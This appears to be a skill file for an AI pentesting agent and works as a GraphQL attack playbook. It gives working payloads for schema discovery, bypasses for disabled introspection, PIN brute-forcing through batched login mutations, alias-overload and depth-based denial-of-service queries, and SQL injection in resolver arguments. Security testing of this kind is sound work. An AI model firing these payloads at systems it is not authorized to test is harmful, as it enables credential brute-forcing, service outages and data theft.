---
name: graphql
description: GraphQL pentest playbook — find the endpoint, dump the schema (introspection or field-suggestion fallback), then test for authorization gaps, query batching, alias overload, depth-based DoS, and SQLi/NoSQLi in resolver arguments.
allowed-tools:
  - http
  - shell
  - file_write
---

# GraphQL playbook

Standard endpoints: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`, `/api/query`.

## 1. Confirm it's GraphQL
```json
{"query":"{__typename}"}
```

## 2. Schema discovery

### Introspection
```json
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
```

### Introspection disabled? Field suggestions
```json
{"query":"{ user { secrt } }"}
```
Reply often contains `Did you mean "secret"?`.

### Aliased introspection bypass
```json
{"query":"query { my_alias: __schema { types { name } } }"}
```

### GET-based bypass
```
GET /graphql?query={__schema{types{name}}}
```

## 3. Authorization gaps
Test patterns:
- Same field through different roots: `me { email }` vs `user(id: <other-id>) { email }`
- Nested traversal: `order(id: X) { user { email phone } }`
- IDOR via mutation

## 4. Query batching
```json
[{"query":"mutation{login(user:\"x\",pin:\"0001\"){token}}"},{"query":"mutation{login(user:\"x\",pin:\"0002\"){token}}"}]
```

## 5. Alias overload
```json
{"query":"{ a1: secret a2: secret ... a1000: secret }"}
```

## 6. Depth attacks
```graphql
{ user { friends { friends { friends { friends { id } } } } } }
```

## 7. SQLi / NoSQLi / SSRF in resolver args
```json
{"query":"query($id:String!){ user(id:$id){name} }","variables":{"id":"1' OR '1'='1"}}
```

## 8. Reporting
Always include:
- Schema dump as evidence
- The exact JSON payload + HTTP request
- Concrete impact
